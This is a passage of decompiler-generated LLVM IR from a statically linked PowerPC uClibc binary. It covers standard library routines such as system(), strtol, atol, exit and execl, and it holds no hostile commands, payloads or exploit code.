  store i32 %v0_10010fc8, i32* %v3_10010fc8, align 4
  %v0_10010fcc = load i32, i32* %r29.global-to-local, align 4
  %v1_10010fcc = load i32, i32* %r0.global-to-local, align 4
  %v2_10010fcc = add i32 %v1_10010fcc, %v0_10010fcc
  store i32 %v2_10010fcc, i32* %r0.global-to-local, align 4
  %v0_10010fd0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010fd0 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010fd0 = add i32 %v1_10010fd0, 16
  %v3_10010fd0 = inttoptr i32 %v2_10010fd0 to i32*
  store i32 %v0_10010fd0, i32* %v3_10010fd0, align 4
  %v0_10010fd4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010fd4 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010fd4 = add i32 %v1_10010fd4, 24
  %v3_10010fd4 = inttoptr i32 %v2_10010fd4 to i32*
  store i32 %v0_10010fd4, i32* %v3_10010fd4, align 4
  store i32 268505052, i32* @lr, align 4
  %v0_10010fd8 = call i32 @srandom_r()
  %v0_10010fdc = load i32, i32* @r31, align 4
  %v3_10010fdc = icmp eq i32 %v0_10010fdc, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10010fe8 = load i32, i32* %r27.global-to-local, align 4
  %v2_10010fe8 = inttoptr i32 %v1_10010fe8 to i32*
  store i32 0, i32* %v2_10010fe8, align 4
  br i1 %v3_10010fdc, label %dec_label_pc_10011020, label %dec_label_pc_10010ff0

dec_label_pc_10010ff0:                            ; preds = %dec_label_pc_10010fac
  %v0_10010ff0 = load i32, i32* @r30, align 4
  %v1_10010ff0 = add i32 %v0_10010ff0, 4
  %v2_10010ff0 = inttoptr i32 %v1_10010ff0 to i32*
  %v3_10010ff0 = load i32, i32* %v2_10010ff0, align 4
  %v0_10010ff4 = load i32, i32* %r29.global-to-local, align 4
  %v2_10010ff4 = sub i32 %v3_10010ff0, %v0_10010ff4
  %v4_10010ff8 = sdiv i32 %v2_10010ff4, 4
  %v1_10010ffc = mul i32 %v4_10010ff8, 5
  %v1_10011000 = load i32, i32* @r31, align 4
  %v2_10011000 = add i32 %v1_10010ffc, %v1_10011000
  store i32 %v2_10011000, i32* %r0.global-to-local, align 4
  %v1_10011004 = load i32, i32* %r27.global-to-local, align 4
  %v2_10011004 = inttoptr i32 %v1_10011004 to i32*
  store i32 %v2_10011000, i32* %v2_10011004, align 4
  br label %dec_label_pc_10011020

dec_label_pc_1001100c:                            ; preds = %dec_label_pc_10010fa0
  %v0_1001100c = call i32 @__errno_location()
  store i32 %v0_1001100c, i32* %r3.global-to-local, align 4
  %v0_10011010 = load i32, i32* %r28.global-to-local, align 4
  %v2_10011010 = inttoptr i32 %v0_1001100c to i32*
  store i32 %v0_10011010, i32* %v2_10011010, align 4
  %v0_10011014 = call i32 @__errno_location()
  %v0_10011018 = load i32, i32* %r28.global-to-local, align 4
  %v2_10011018 = inttoptr i32 %v0_10011014 to i32*
  store i32 %v0_10011018, i32* %v2_10011018, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011020

dec_label_pc_10011020:                            ; preds = %dec_label_pc_10010fac, %dec_label_pc_10010ff0, %dec_label_pc_1001100c
  store i32 %v0_10010f54, i32* %r0.global-to-local, align 4
  %v0_10011030 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10011030

; uselistorder directives
  uselistorder i32 %v2_10010fb4, { 1, 0, 2 }
  uselistorder i32 %v0_10010fac, { 1, 0 }
  uselistorder i32 %v2_10010f60, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001a228.651 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_10011020, { 2, 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1001103c = load i32, i32* @r31, align 4
  %v3_10011044 = icmp eq i32 %arg1, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_10011044, label %dec_label_pc_10011174, label %dec_label_pc_10011054

dec_label_pc_10011054:                            ; preds = %entry
  store i32 268505184, i32* @lr, align 4
  %v2_1001105c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268505200, i32* @lr, align 4
  %v2_1001106c = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 268505216, i32* @lr, align 4
  %v2_1001107c = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_1001107c, i32* @r3, align 4
  store i32 268505224, i32* @lr, align 4
  %v0_10011084 = call i32 @__vfork()
  store i32 %v0_10011084, i32* @r31, align 4
  %tmp10 = icmp sgt i32 %v0_10011084, -1
  br i1 %tmp10, label %dec_label_pc_100110bc, label %dec_label_pc_10011090

dec_label_pc_10011090:                            ; preds = %dec_label_pc_10011054
  store i32 268505244, i32* @lr, align 4
  %v2_10011098 = call i32 @__bsd_signal(i32 3, i32 %v2_1001105c)
  store i32 268505256, i32* @lr, align 4
  %v2_100110a4 = call i32 @__bsd_signal(i32 2, i32 %v2_1001106c)
  store i32 268505268, i32* @lr, align 4
  %v2_100110b0 = call i32 @__bsd_signal(i32 17, i32 %v2_1001107c)
  br label %dec_label_pc_10011174

dec_label_pc_100110bc:                            ; preds = %dec_label_pc_10011054
  %v3_10011088 = icmp eq i32 %v0_10011084, 0
  br i1 %v3_10011088, label %dec_label_pc_100110c0, label %dec_label_pc_10011114

dec_label_pc_100110c0:                            ; preds = %dec_label_pc_100110bc
  store i32 268505292, i32* @lr, align 4
  %v2_100110c8 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 268505304, i32* @lr, align 4
  %v2_100110d4 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 268505316, i32* @lr, align 4
  %v2_100110e0 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_10011108 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1001a250.653 to i32), i32 ptrtoint ([3 x i8]* @global_var_1001a258.654 to i32), i32 ptrtoint ([3 x i8]* @global_var_1001a25c.655 to i32), i32 %arg1, i32 0)
  %v1_10011110 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_10011114

dec_label_pc_10011114:                            ; preds = %dec_label_pc_100110bc, %dec_label_pc_100110c0
  store i32 268505376, i32* @lr, align 4
  %v2_1001111c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268505388, i32* @lr, align 4
  %v2_10011128 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_1001112c = load i32, i32* @r31, align 4
  store i32 268505408, i32* @lr, align 4
  %v4_1001113c = call i32 @wait4(i32 %v0_1001112c)
  %v3_10011140 = icmp eq i32 %v4_1001113c, -1
  br i1 %v3_10011140, label %dec_label_pc_10011148, label %dec_label_pc_1001114c

dec_label_pc_10011148:                            ; preds = %dec_label_pc_10011114
  store i32 -1, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1001114c

dec_label_pc_1001114c:                            ; preds = %dec_label_pc_10011114, %dec_label_pc_10011148
  store i32 268505432, i32* @lr, align 4
  %v2_10011154 = call i32 @__bsd_signal(i32 3, i32 %v2_1001105c)
  store i32 268505444, i32* @lr, align 4
  %v2_10011160 = call i32 @__bsd_signal(i32 2, i32 %v2_1001106c)
  store i32 268505456, i32* @lr, align 4
  %v2_1001116c = call i32 @__bsd_signal(i32 17, i32 %v2_1001107c)
  %v3_10011170 = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_10011174

dec_label_pc_10011174:                            ; preds = %entry, %dec_label_pc_10011090, %dec_label_pc_1001114c
  %v0_10011184 = phi i32 [ 1, %entry ], [ -1, %dec_label_pc_10011090 ], [ %v3_10011170, %dec_label_pc_1001114c ]
  store i32 %v0_1001103c, i32* @r31, align 4
  ret i32 %v0_10011184

; uselistorder directives
  uselistorder i32 %v0_10011084, { 1, 0, 2 }
  uselistorder i32 %v2_1001107c, { 1, 0, 2 }
  uselistorder i32 %v2_1001106c, { 1, 0 }
  uselistorder i32 %v2_1001105c, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_10011174, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001114c, { 1, 0 }
  uselistorder label %dec_label_pc_10011114, { 1, 0 }
}

define i32 @atol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_10011190 = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_10011190
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_10011198 = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_10011198
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100111ac = load i32, i32* @r4, align 4
  store i32 %v0_100111ac, i32* @r25, align 4
  %v0_100111b4 = load i32, i32* @r5, align 4
  store i32 %v0_100111b4, i32* %r30.global-to-local, align 4
  %v0_100111b8 = load i32, i32* @r6, align 4
  store i32 %v0_100111b8, i32* @r26, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_100111c0 = load i32, i32* @global_var_1002ab70, align 4
  br label %dec_label_pc_100111cc

dec_label_pc_100111c8:                            ; preds = %dec_label_pc_100111cc
  %v1_100111c8 = add i32 %v0_10011200, 1
  store i32 %v1_100111c8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100111cc

dec_label_pc_100111cc:                            ; preds = %entry, %dec_label_pc_100111c8
  %v0_10011200 = phi i32 [ %tmp, %entry ], [ %v1_100111c8, %dec_label_pc_100111c8 ]
  %v1_100111cc = inttoptr i32 %v0_10011200 to i8*
  %v2_100111cc = load i8, i8* %v1_100111cc, align 1
  %v3_100111cc = zext i8 %v2_100111cc to i32
  %v1_100111d0 = mul nuw nsw i32 %v3_100111cc, 2
  %v2_100111d4 = add i32 %v1_100111d0, %v3_100111c0
  %v3_100111d4 = inttoptr i32 %v2_100111d4 to i16*
  %v4_100111d4 = load i16, i16* %v3_100111d4, align 2
  %v1_100111d8 = and i16 %v4_100111d4, 32
  %v3_100111d8 = icmp eq i16 %v1_100111d8, 0
  br i1 %v3_100111d8, label %dec_label_pc_100111e0, label %dec_label_pc_100111c8

dec_label_pc_100111e0:                            ; preds = %dec_label_pc_100111cc
  %v3_100111e0 = icmp eq i8 %v2_100111cc, 43
  br i1 %v3_100111e0, label %dec_label_pc_10011200, label %dec_label_pc_100111e8

dec_label_pc_100111e8:                            ; preds = %dec_label_pc_100111e0
  %v3_100111e8 = icmp eq i8 %v2_100111cc, 45
  store i32 0, i32* @r28, align 4
  br i1 %v3_100111e8, label %dec_label_pc_10011200, label %dec_label_pc_10011204

dec_label_pc_10011200:                            ; preds = %dec_label_pc_100111e0, %dec_label_pc_100111e8
  %storemerge = phi i32 [ 1, %dec_label_pc_100111e8 ], [ 0, %dec_label_pc_100111e0 ]
  store i32 %storemerge, i32* @r28, align 4
  %v1_10011200 = add i32 %v0_10011200, 1
  store i32 %v1_10011200, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011204

dec_label_pc_10011204:                            ; preds = %dec_label_pc_100111e8, %dec_label_pc_10011200
  %v1_10011204 = call i32 @__asm_rlwinm.(i32 %v0_100111b4, i32 0, i32 28, i32 26)
  %v4_10011204 = icmp eq i32 %v1_10011204, 0
  br i1 %v4_10011204, label %dec_label_pc_10011210, label %dec_label_pc_10011204.dec_label_pc_1001124c_crit_edge

dec_label_pc_10011204.dec_label_pc_1001124c_crit_edge: ; preds = %dec_label_pc_10011204
  %v0_1001124c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001124c

dec_label_pc_10011210:                            ; preds = %dec_label_pc_10011204
  %v0_10011210 = load i32, i32* %r31.global-to-local, align 4
  %v1_10011210 = inttoptr i32 %v0_10011210 to i8*
  %v2_10011210 = load i8, i8* %v1_10011210, align 1
  %v0_10011214 = load i32, i32* %r30.global-to-local, align 4
  %v1_10011214 = add i32 %v0_10011214, 10
  store i32 %v1_10011214, i32* %r30.global-to-local, align 4
  %v3_10011218 = icmp eq i8 %v2_10011210, 48
  br i1 %v3_10011218, label %dec_label_pc_10011220, label %dec_label_pc_10011240

dec_label_pc_10011220:                            ; preds = %dec_label_pc_10011210
  %v1_10011220 = add i32 %v0_10011210, 1
  %v2_10011220 = inttoptr i32 %v1_10011220 to i8*
  %v3_10011220 = load i8, i8* %v2_10011220, align 1
  %v4_10011220 = zext i8 %v3_10011220 to i32
  store i32 %v1_10011220, i32* %r31.global-to-local, align 4
  %v1_10011224 = add i32 %v0_10011214, 8
  store i32 %v1_10011224, i32* %r30.global-to-local, align 4
  %v1_10011228 = or i32 %v4_10011220, 32
  %v3_10011230 = icmp eq i32 %v1_10011228, 120
  br i1 %v3_10011230, label %dec_label_pc_10011238, label %dec_label_pc_10011240

dec_label_pc_10011238:                            ; preds = %dec_label_pc_10011220
  %v1_10011238 = mul i32 %v1_10011224, 2
  store i32 %v1_10011238, i32* %r30.global-to-local, align 4
  %v1_1001123c = add i32 %v0_10011210, 2
  store i32 %v1_1001123c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011240

dec_label_pc_10011240:                            ; preds = %dec_label_pc_10011220, %dec_label_pc_10011210, %dec_label_pc_10011238
  %v0_100112f415 = phi i32 [ %v1_10011220, %dec_label_pc_10011238 ], [ %tmp, %dec_label_pc_10011210 ], [ %v1_10011220, %dec_label_pc_10011220 ]
  %v0_10011240 = phi i32 [ %v1_10011238, %dec_label_pc_10011238 ], [ %v1_10011214, %dec_label_pc_10011210 ], [ %v1_10011224, %dec_label_pc_10011220 ]
  %tmp22 = icmp slt i32 %v0_10011240, 17
  br i1 %tmp22, label %dec_label_pc_1001124c, label %dec_label_pc_10011248

dec_label_pc_10011248:                            ; preds = %dec_label_pc_10011240
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001124c

dec_label_pc_1001124c:                            ; preds = %dec_label_pc_10011204.dec_label_pc_1001124c_crit_edge, %dec_label_pc_10011240, %dec_label_pc_10011248
  %v0_100112f414 = phi i32 [ %tmp, %dec_label_pc_10011204.dec_label_pc_1001124c_crit_edge ], [ %v0_100112f415, %dec_label_pc_10011240 ], [ %v0_100112f415, %dec_label_pc_10011248 ]
  %v1_10011260 = phi i32 [ %v0_1001124c.pre, %dec_label_pc_10011204.dec_label_pc_1001124c_crit_edge ], [ %v0_10011240, %dec_label_pc_10011240 ], [ 16, %dec_label_pc_10011248 ]
  %v1_1001124c = add i32 %v1_10011260, -2
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_10011254 = icmp ugt i32 %v1_1001124c, 34
  br i1 %v2_10011254, label %dec_label_pc_100112ec, label %dec_label_pc_1001125c

dec_label_pc_1001125c:                            ; preds = %dec_label_pc_1001124c
  %v2_10011260 = udiv i32 -1, %v1_10011260
  store i32 %v2_10011260, i32* @r29, align 4
  %v2_10011264 = mul i32 %v2_10011260, %v1_10011260
  %v1_10011268 = sub i32 -1, %v2_10011264
  %v1_1001126c = urem i32 %v1_10011268, 256
  store i32 %v1_1001126c, i32* @r27, align 4
  %v0_10011278.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10011278

dec_label_pc_10011274:                            ; preds = %dec_label_pc_100112e0, %dec_label_pc_100112c8
  %v1_1001127c.pre = phi i32 [ %v1_10011280, %dec_label_pc_100112e0 ], [ %v1_1001127c.pre.pre, %dec_label_pc_100112c8 ]
  %v0_1001127c.pre = phi i32 [ %v2_100112e4, %dec_label_pc_100112e0 ], [ %v0_1001127c.pre.pre, %dec_label_pc_100112c8 ]
  %v0_10011274 = phi i32 [ %v1_10011284, %dec_label_pc_100112e0 ], [ %v0_10011274.pre, %dec_label_pc_100112c8 ]
  br label %dec_label_pc_10011278

dec_label_pc_10011278:                            ; preds = %dec_label_pc_1001125c, %dec_label_pc_10011274
  %v0_100112f412 = phi i32 [ %v0_100112f414, %dec_label_pc_1001125c ], [ %v0_10011274, %dec_label_pc_10011274 ]
  %v0_10011284 = phi i32 [ %v0_10011278.pre, %dec_label_pc_1001125c ], [ %v0_10011274, %dec_label_pc_10011274 ]
  %v1_10011280 = phi i32 [ %v2_10011260, %dec_label_pc_1001125c ], [ %v1_1001127c.pre, %dec_label_pc_10011274 ]
  %v0_100112e0 = phi i32 [ 0, %dec_label_pc_1001125c ], [ %v0_1001127c.pre, %dec_label_pc_10011274 ]
  %v1_10011278 = inttoptr i32 %v0_10011284 to i8*
  %v2_10011278 = load i8, i8* %v1_10011278, align 1
  %v3_10011278 = zext i8 %v2_10011278 to i32
  %v3_1001127c = icmp ugt i32 %v0_100112e0, %v1_10011280
  %v1_10011284 = add i32 %v0_10011284, 1
  store i32 %v1_10011284, i32* %r31.global-to-local, align 4
  %v1_10011288 = add nsw i32 %v3_10011278, -48
  %v1_1001128c = or i32 %v3_10011278, 32
  %v1_10011290 = urem i32 %v1_10011288, 256
  %tmp23 = icmp ult i32 %v1_10011290, 10
  br i1 %tmp23, label %dec_label_pc_100112b0, label %dec_label_pc_100112a0

dec_label_pc_100112a0:                            ; preds = %dec_label_pc_10011278
  %tmp24 = icmp ult i32 %v1_1001128c, 97
  br i1 %tmp24, label %dec_label_pc_100112b0, label %dec_label_pc_100112ac

dec_label_pc_100112ac:                            ; preds = %dec_label_pc_100112a0
  %v1_100112a0 = add nsw i32 %v1_1001128c, -87
  %v1_100112ac = urem i32 %v1_100112a0, 256
  br label %dec_label_pc_100112b0

dec_label_pc_100112b0:                            ; preds = %dec_label_pc_100112a0, %dec_label_pc_10011278, %dec_label_pc_100112ac
  %v1_100112e4 = phi i32 [ 40, %dec_label_pc_100112a0 ], [ %v1_10011290, %dec_label_pc_10011278 ], [ %v1_100112ac, %dec_label_pc_100112ac ]
  %v1_100112b0 = load i32, i32* %r30.global-to-local, align 4
  %v2_100112b0 = icmp slt i32 %v1_100112e4, %v1_100112b0
  br i1 %v2_100112b0, label %dec_label_pc_100112b8, label %dec_label_pc_100112ec

dec_label_pc_100112b8:                            ; preds = %dec_label_pc_100112b0
  br i1 %v3_1001127c, label %dec_label_pc_100112c8, label %dec_label_pc_100112bc

dec_label_pc_100112bc:                            ; preds = %dec_label_pc_100112b8
  %v1_100112bc = load i32, i32* @r27, align 4
  %v0_100112c0.not = icmp ne i32 %v0_100112e0, %v1_10011280
  %tmp25 = icmp ule i32 %v1_100112e4, %v1_100112bc
  %or.cond = or i1 %tmp25, %v0_100112c0.not
  br i1 %or.cond, label %dec_label_pc_100112e0, label %dec_label_pc_100112c8

dec_label_pc_100112c8:                            ; preds = %dec_label_pc_100112bc, %dec_label_pc_100112b8
  %v0_100112c8 = call i32 @__errno_location()
  %v0_100112cc = load i32, i32* @r28, align 4
  %v1_100112cc = load i32, i32* @r26, align 4
  %v2_100112cc = and i32 %v1_100112cc, %v0_100112cc
  store i32 %v2_100112cc, i32* @r28, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  %v2_100112d8 = inttoptr i32 %v0_100112c8 to i32*
  store i32 34, i32* %v2_100112d8, align 4
  %v0_10011274.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1001127c.pre.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1001127c.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10011274

dec_label_pc_100112e0:                            ; preds = %dec_label_pc_100112bc
  %v2_100112e0 = mul i32 %v1_100112b0, %v0_100112e0
  %v2_100112e4 = add i32 %v2_100112e0, %v1_100112e4
  store i32 %v2_100112e4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10011274

dec_label_pc_100112ec:                            ; preds = %dec_label_pc_100112b0, %dec_label_pc_1001124c
  %v0_100112f4 = phi i32 [ %v0_100112f414, %dec_label_pc_1001124c ], [ %v0_100112f412, %dec_label_pc_100112b0 ]
  %v0_100112ec = load i32, i32* @r25, align 4
  %v3_100112ec = icmp eq i32 %v0_100112ec, 0
  br i1 %v3_100112ec, label %dec_label_pc_100112f8, label %dec_label_pc_100112f4

dec_label_pc_100112f4:                            ; preds = %dec_label_pc_100112ec
  %v2_100112f4 = inttoptr i32 %v0_100112ec to i32*
  store i32 %v0_100112f4, i32* %v2_100112f4, align 4
  br label %dec_label_pc_100112f8

dec_label_pc_100112f8:                            ; preds = %dec_label_pc_100112ec, %dec_label_pc_100112f4
  %v0_100112f8 = load i32, i32* @r26, align 4
  %v3_100112f8 = icmp eq i32 %v0_100112f8, 0
  %v0_100112fc = load i32, i32* @r28, align 4
  %v1_100112fc = sub i32 0, %v0_100112fc
  %tmp27 = lshr i32 %v1_100112fc, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_1001133c.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v3_100112f8, label %dec_label_pc_1001132c, label %dec_label_pc_10011314

dec_label_pc_10011314:                            ; preds = %dec_label_pc_100112f8
  %v3_10011314 = icmp ugt i32 %v0_1001133c.pre.pre, %tmp28
  br i1 %v3_10011314, label %dec_label_pc_1001131c, label %dec_label_pc_1001132c

dec_label_pc_1001131c:                            ; preds = %dec_label_pc_10011314
  %v0_1001131c = call i32 @__errno_location()
  %v2_10011324 = inttoptr i32 %v0_1001131c to i32*
  store i32 34, i32* %v2_10011324, align 4
  %v0_10011328 = load i32, i32* @r31, align 4
  store i32 %v0_10011328, i32* %r8.global-to-local, align 4
  %v0_1001132c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001132c

dec_label_pc_1001132c:                            ; preds = %dec_label_pc_100112f8, %dec_label_pc_10011314, %dec_label_pc_1001131c
  %v0_1001133c.pre = phi i32 [ %v0_1001133c.pre.pre, %dec_label_pc_10011314 ], [ %v0_10011328, %dec_label_pc_1001131c ], [ %v0_1001133c.pre.pre, %dec_label_pc_100112f8 ]
  %v0_1001132c = phi i32 [ %v0_100112fc, %dec_label_pc_10011314 ], [ %v0_1001132c.pre, %dec_label_pc_1001131c ], [ %v0_100112fc, %dec_label_pc_100112f8 ]
  %v3_1001132c = icmp eq i32 %v0_1001132c, 0
  br i1 %v3_1001132c, label %dec_label_pc_10011338, label %dec_label_pc_10011334

dec_label_pc_10011334:                            ; preds = %dec_label_pc_1001132c
  %v1_10011334 = sub i32 0, %v0_1001133c.pre
  store i32 %v1_10011334, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10011338

dec_label_pc_10011338:                            ; preds = %dec_label_pc_1001132c, %dec_label_pc_10011334
  %v0_1001133c = phi i32 [ %v1_10011334, %dec_label_pc_10011334 ], [ %v0_1001133c.pre, %dec_label_pc_1001132c ]
  ret i32 %v0_1001133c

; uselistorder directives
  uselistorder i32 %v0_1001133c.pre, { 1, 0 }
  uselistorder i32 %v0_1001133c.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_100112e4, { 1, 0 }
  uselistorder i32 %v1_10011290, { 1, 0 }
  uselistorder i32 %v1_1001128c, { 1, 0 }
  uselistorder i32 %v1_10011284, { 1, 0 }
  uselistorder i32 %v3_10011278, { 1, 0 }
  uselistorder i32 %v0_100112e0, { 1, 0, 2 }
  uselistorder i32 %v1_10011280, { 0, 2, 1 }
  uselistorder i32 %v0_10011274, { 1, 0 }
  uselistorder i32 %v2_10011260, { 1, 0, 2 }
  uselistorder i32 %v1_10011238, { 1, 0 }
  uselistorder i32 %v1_10011224, { 1, 0, 2 }
  uselistorder i32 %v0_10011200, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 6, 2, 3, 7, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 4, 1, 0, 2, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_10011338, { 1, 0 }
  uselistorder label %dec_label_pc_1001132c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100112f8, { 1, 0 }
  uselistorder label %dec_label_pc_100112b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011278, { 1, 0 }
  uselistorder label %dec_label_pc_1001124c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10011240, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011204, { 1, 0 }
  uselistorder label %dec_label_pc_10011200, { 1, 0 }
  uselistorder label %dec_label_pc_100111cc, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10011368 = ptrtoint i32* %stack_var_-40 to i32
  %v0_10011374 = load i32, i32* @r3, align 4
  store i32 %v0_10011374, i32* @r31, align 4
  store i32 %v2_10011368, i32* @r3, align 4
  %v0_10011380 = call i32 @__pthread_return_void()
  %v0_10011388 = call i32 @__pthread_return_0()
  %v3_10011390 = load i32, i32* @global_var_1002abec.659, align 4
  %v3_10011394 = icmp eq i32 %v3_10011390, 0
  br i1 %v3_10011394, label %dec_label_pc_100113a8, label %dec_label_pc_1001139c

dec_label_pc_1001139c:                            ; preds = %entry
  %v0_1001139c = load i32, i32* @r31, align 4
  %v3_100113a4 = call i32 @unknown_0(i32 %v0_1001139c, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  br label %dec_label_pc_100113a8

dec_label_pc_100113a8:                            ; preds = %entry, %dec_label_pc_1001139c
  store i32 %v2_10011368, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_100113b0 = call i32 @__pthread_return_void()
  store i32 %v0_100113b0, i32* @r3, align 4
  store i32 268506040, i32* @lr, align 4
  %v1_100113b4 = call i32 @__GI___uClibc_fini(i32 %v0_100113b0)
  store i32 268506060, i32* @lr, align 4
  %v2_100113c8 = call i32 @_stdio_term(i32 %v1_100113b4, i32 268493036)
  %v0_100113cc = load i32, i32* @r31, align 4
  %v1_100113d0 = call i32 @__GI__exit(i32 %v0_100113cc)
  ret i32 %v1_100113d0

; uselistorder directives
  uselistorder label %dec_label_pc_100113a8, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100113d4 = ptrtoint i32* %stack_var_0 to i32
  %v2_100113f0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100113f0, i32* %r0.global-to-local, align 4
  %v2_100113f8 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_100113f0, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10011424

dec_label_pc_10011424:                            ; preds = %dec_label_pc_10011454, %entry
  %v0_10011428 = phi i32 [ 0, %entry ], [ %v1_10011428, %dec_label_pc_10011454 ]
  %stack_var_-52.0 = phi i32 [ %v2_100113f8, %entry ], [ %stack_var_-52.1, %dec_label_pc_10011454 ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_10011454 ]
  %v4_10011424 = zext i8 %stack_var_-56.0 to i32
  %v1_10011428 = add i32 %v0_10011428, 1
  %v1_10011430 = mul nuw nsw i32 %v4_10011424, 4
  store i32 %v1_10011430, i32* %r0.global-to-local, align 4
  %v2_10011434 = add i32 %v1_10011430, %v2_100113f0
  store i32 %v2_10011434, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_10011448, label %dec_label_pc_10011440

dec_label_pc_10011440:                            ; preds = %dec_label_pc_10011424
  %v1_10011438 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_10011454

dec_label_pc_10011448:                            ; preds = %dec_label_pc_10011424
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_1001144c = add i32 %stack_var_-52.0, 4
  store i32 %v1_1001144c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10011454

dec_label_pc_10011454:                            ; preds = %dec_label_pc_10011440, %dec_label_pc_10011448
  %stack_var_-52.1 = phi i32 [ %v1_1001144c, %dec_label_pc_10011448 ], [ %stack_var_-52.0, %dec_label_pc_10011440 ]
  %v0_10011454 = phi i32 [ %stack_var_-52.0, %dec_label_pc_10011448 ], [ %v2_10011434, %dec_label_pc_10011440 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_10011448 ], [ %v1_10011438, %dec_label_pc_10011440 ]
  %v1_10011454 = inttoptr i32 %v0_10011454 to i32*
  %v2_10011454 = load i32, i32* %v1_10011454, align 4
  store i32 %v2_10011454, i32* %r0.global-to-local, align 4
